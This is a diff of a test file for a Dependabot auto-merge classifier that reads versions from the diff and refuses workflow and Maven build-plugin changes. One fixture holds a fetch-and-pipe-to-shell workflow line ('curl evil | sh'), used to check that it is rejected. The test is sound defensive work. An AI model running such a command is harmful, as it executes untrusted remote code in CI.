@@ -7,11 +7,29 @@ import { dirname, join } from 'node:path';
 import test from 'node:test';
 import { fileURLToPath } from 'node:url';
 
-import { classify, filesAreSafe, isActionsNonMajor, isPatchUpdate, parseTitle } from './dependabot-automerge.mjs';
+import { classify, diffVersions, filesAreSafe, isPatchUpdate, parseTitle } from './dependabot-automerge.mjs';
 
 const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
 const pom = [{ filename: 'saiku-core/pom.xml', patch: '-<version>1.0.0</version>\n+<version>1.0.1</version>' }];
-const lock = [{ filename: 'saiku-ui/package.json' }, { filename: 'saiku-ui/package-lock.json' }];
+const pkg = [{ filename: 'saiku-ui/package.json', patch: '-    "foo": "^1.2.3",\n+    "foo": "^1.2.4",' }];
+const lock = [{ filename: 'saiku-ui/package-lock.json', patch: '-        "version": "1.2.3"\n+        "version": "1.2.4"' }];
+// GitHub's actual patch for Dependabot PR #2506: <plugin> is outside the hunk, but
+// <artifactId>jacoco-maven-plugin</artifactId> is in its three lines of context.
+const jacocoPatch = [{
+  filename: 'pom.xml',
+  patch: [
+    '@@ -189,7 +189,7 @@',
+    '                      .coverage-thresholds.json via scripts/check-coverage.sh. -->',
+    '                 <groupId>org.jacoco</groupId>',
+    '                 <artifactId>jacoco-maven-plugin</artifactId>',
+    '-                <version>0.8.15</version>',
+    '+                <version>0.8.16</version>',
+    '                 <executions>',
+    '                     <execution>',
+    '                         <id>jacoco-prepare-agent</id>',
+  ].join('\n'),
+}];
+
 const usesFile = (patch) => [{ filename: '.github/workflows/ci.yml', patch }];
 
 test('parseTitle accepts single-package bumps and rejects groups', () => {
@@ -30,42 +48,137 @@ test('isPatchUpdate allows only same major.minor with a higher patch', () => {
   assert.equal(isPatchUpdate('1.2.4', '1.2.3'), false);
 });
 
-test('isActionsNonMajor allows minor, patch and digest changes but never a major', () => {
-  assert.equal(isActionsNonMajor('4.1.0', '4.2.0'), true);
-  assert.equal(isActionsNonMajor('v4', 'v4.1'), true);
-  assert.equal(isActionsNonMajor('a1b2c3d', 'e4f5a6b'), true);
-  assert.equal(isActionsNonMajor('4.9.0', '5.0.0'), false);
-  assert.equal(isActionsNonMajor('v4', 'v5'), false);
+test('diffVersions reads the version pair from the diff, not the title', () => {
+  assert.deepEqual(diffVersions(pom), { ok: true, from: '1.0.0', to: '1.0.1' });
+  assert.deepEqual(diffVersions(pkg), { ok: true, from: '1.2.3', to: '1.2.4' });
+  // package.json and package-lock.json in one PR: one identical pair across both files
+  assert.deepEqual(diffVersions([...pkg, ...lock]), { ok: true, from: '1.2.3', to: '1.2.4' });
+  // maven property form (the root pom shadows BOM versions through properties)
+  assert.deepEqual(
+    diffVersions([{ filename: 'pom.xml', patch: '-    <jackson.version>2.18.6</jackson.version>\n+    <jackson.version>2.18.7</jackson.version>' }]),
+    { ok: true, from: '2.18.6', to: '2.18.7' }
+  );
+  // unchanged on one side, several versions, or no version token at all: unprovable
+  assert.equal(diffVersions([{ filename: 'saiku-ui/package.json', patch: '+    "foo": "^1.2.4",' }]).ok, false);
+  assert.equal(
+    diffVersions([{ filename: 'pom.xml', patch: '-<version>1.0.0</version>\n+<version>1.0.1</version>\n-<version>2.0.0</version>\n+<version>2.0.1</version>' }]).ok,
+    false
+  );
+  assert.equal(diffVersions([{ filename: 'saiku-ui/package.json', patch: '-    "main": "src/index.js"\n+    "main": "src/main.js"' }]).ok, false);
+  assert.equal(diffVersions([]).ok, false);
 });
 
-test('filesAreSafe requires manifests or workflow uses: lines only', () => {
+test('diffVersions refuses a maven hunk that looks like a build-plugin change', () => {
+  // a version inside a <plugin> block (context lines carry <plugin> or *.plugin.version)
+  assert.equal(
+    diffVersions([{
+      filename: 'pom.xml',
+      patch: '@@ -10,7 +10,7 @@\n       <plugin>\n         <groupId>org.apache.maven.plugins</groupId>\n         <artifactId>maven-shade-plugin</artifactId>\n-        <version>3.6.0</version>\n+        <version>3.6.1</version>',
+    }]).ok,
+    false
+  );
+  assert.equal(
+    diffVersions([{ filename: 'pom.xml', patch: '-    <maven-shade-plugin.version>3.6.0</maven-shade-plugin.version>\n+    <maven-shade-plugin.version>3.6.1</maven-shade-plugin.version>' }]).ok,
+    false
+  );
+  assert.deepEqual(diffVersions(jacocoPatch), {
+    ok: false,
+    reason: 'pom.xml looks like a Maven build-plugin change (plugins execute at build time)',
+  });
+  // a dependency block whose context names no plugin is fine
+  assert.equal(
+    diffVersions([{
+      filename: 'saiku-core/pom.xml',
+      patch: '@@ -1,7 +1,7 @@\n       <dependency>\n         <groupId>com.fasterxml.jackson.core</groupId>\n         <artifactId>jackson-databind</artifactId>\n-        <version>2.18.6</version>\n+        <version>2.18.7</version>',
+    }]).ok,
+    true
+  );
+});
+
+test('diffVersions refuses every manifest whose patch is missing', () => {
+  const missingLock = [...pkg, { filename: 'saiku-ui/package-lock.json' }];
+  const missingPom = [...pom, { filename: 'saiku-bom/pom.xml' }];
+  assert.deepEqual(diffVersions(missingLock), { ok: false, reason: 'saiku-ui/package-lock.json has no patch to inspect' });
+  assert.deepEqual(diffVersions(missingPom), { ok: false, reason: 'saiku-bom/pom.xml has no patch to inspect' });
+  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['npm'], files: missingLock }).eligible, false);
+  assert.equal(classify({ title: 'Bump foo from 1.0.0 to 1.0.1', labels: ['maven'], files: missingPom }).eligible, false);
+});
+
+test('filesAreSafe requires manifests and lockfiles, never workflow files', () => {
   assert.equal(filesAreSafe(pom), true);
   assert.equal(filesAreSafe(lock), true);
-  assert.equal(filesAreSafe(usesFile('-      - uses: actions/checkout@aaa\n+      - uses: actions/checkout@bbb')), true);
-  assert.equal(filesAreSafe(usesFile('-      - uses: actions/checkout@aaa\n+      - run: curl evil | sh')), false);
-  assert.equal(filesAreSafe([...pom, { filename: 'src/Main.java' }]), false);
+  assert.equal(filesAreSafe([...pkg, ...lock]), true);
+  // any file under .github/workflows/ disqualifies the PR (#2548), uses:-only or not
+  assert.equal(filesAreSafe(usesFile('-      - uses: actions/checkout@aaa\n+      - uses: actions/checkout@bbb')), false);
+  assert.equal(filesAreSafe(usesFile('-      - run: curl evil | sh')), false);
   assert.equal(filesAreSafe([{ filename: '.github/workflows/ci.yml' }]), false);
+  assert.equal(filesAreSafe([...pom, { filename: '.github/workflows/dependabot-automerge.yml', patch: '-      - uses: a/b@x\n+      - uses: a/b@y' }]), false);
+  assert.equal(filesAreSafe([...pom, { filename: 'src/Main.java' }]), false);
   assert.equal(filesAreSafe([]), false);
 });
 
-test('classify auto-merges a single maven patch bump', () => {
-  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['dependencies', 'maven'], files: pom }).eligible, true);
+test('classify auto-merges a single maven patch bump, proven by the diff', () => {
+  const result = classify({ title: 'Bump foo from 1.0.0 to 1.0.1', labels: ['dependencies', 'maven'], files: pom });
+  assert.equal(result.eligible, true);
 });
 
-test('classify refuses majors, minors, groups, docker, unlabelled and non-manifest changes', () => {
-  const labels = ['dependencies', 'npm'];
-  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 2.0.0', labels, files: lock }).eligible, false);
-  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.3.0', labels, files: lock }).eligible, false);
-  assert.equal(classify({ title: 'Bump the dev-tooling group with 2 updates', labels, files: lock }).eligible, false);
-  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['docker'], files: lock }).eligible, false);
-  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: [], files: lock }).eligible, false);
-  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels, files: [{ filename: 'a.java' }] }).eligible, false);
+test('classify holds Maven build-plugin bumps for a person', () => {
+  assert.equal(classify({
+    title: 'Bump org.jacoco:jacoco-maven-plugin from 0.8.15 to 0.8.16',
+    labels: ['dependencies', 'maven'],
+    files: jacocoPatch,
+  }).eligible, false);
+  // Editing the title cannot hide a plugin artifact that is present in the hunk.
+  assert.equal(classify({
+    title: 'Bump unrelated-artifact from 0.8.15 to 0.8.16',
+    labels: ['maven'],
+    files: jacocoPatch,
+  }).eligible, false);
+  // The title is a second guard when the hunk has no plugin context.
+  assert.equal(classify({
+    title: 'Bump org.apache.maven.plugins:maven-shade-plugin from 1.0.0 to 1.0.1',
+    labels: ['maven'],
+    files: pom,
+  }).eligible, false);
 });
 
-test('classify auto-merges github-actions non-major bumps only', () => {
+test('classify never auto-merges a github-actions bump, even a patch (#2548)', () => {
   const patch = '-      - uses: a/b@x\n+      - uses: a/b@y';
-  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 4.2.0', labels: ['github-actions'], files: usesFile(patch) }).eligible, true);
-  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 5.0.0', labels: ['github-actions'], files: usesFile(patch) }).eligible, false);
+  // labelled github-actions, and/or touching .github/workflows/ — both refuse
+  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 4.1.1', labels: ['github-actions'], files: usesFile(patch) }).eligible, false);
+  assert.equal(classify({ title: 'Bump a/b from abc1234 to def5678', labels: ['github-actions'], files: usesFile(patch) }).eligible, false);
+  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 4.1.1', labels: ['dependencies', 'maven'], files: usesFile(patch) }).eligible, false);
+  assert.equal(classify({ title: 'Bump a/b from abc1234 to def5678', labels: ['github-actions'], files: lock }).eligible, false);
+});
+
+test('classify refuses majors, minors, groups, docker, unlabelled, non-manifests and title/diff mismatch', () => {
+  const labels = ['dependencies', 'npm'];
+  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 2.0.0', labels, files: [...pkg, ...lock] }).eligible, false);
+  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.3.0', labels, files: [...pkg, ...lock] }).eligible, false);
+  assert.equal(classify({ title: 'Bump the dev-tooling group with 2 updates', labels, files: [...pkg, ...lock] }).eligible, false);
+  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['docker'], files: [...pkg, ...lock] }).eligible, false);
+  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: [], files: [...pkg, ...lock] }).eligible, false);
+  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels, files: [{ filename: 'a.java' }] }).eligible, false);
+  // the title is only a cross-check: a triager editing it cannot change eligibility
+  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 2.0.0', labels, files: [...pkg, ...lock] }).eligible, false);
+  assert.equal(classify({ title: 'Bump foo from 9.9.9 to 1.2.4', labels, files: [...pkg, ...lock] }).eligible, false);
+});
+
+test('classify auto-merges an npm patch bump whose versions come from package.json and the lockfile', () => {
+  const result = classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['dependencies', 'npm'], files: [...pkg, ...lock] });
+  assert.equal(result.eligible, true);
+});
+
+test('.github/dependabot.yml holds every ecosystem back with a cooldown of at least 3 days', () => {
+  const text = readFileSync(join(root, '.github', 'dependabot.yml'), 'utf8');
+  const blocks = text.split(/^\s*-\s+package-ecosystem:/m).slice(1);
+  assert.equal(blocks.length, 4, 'four ecosystems: maven, github-actions, docker, npm');
+  for (const block of blocks) {
+    const ecosystem = block.split('\n')[0].trim();
+    const match = /cooldown:\s*\n\s+default-days:\s*(\d+)/.exec(block);
+    assert.ok(match, `${ecosystem} sets a cooldown default-days`);
+    assert.ok(Number(match[1]) >= 3, `${ecosystem} cooldown is at least 3 days (got ${match[1]})`);
+  }
 });
 
 test('the workflow keeps its safety shape', () => {
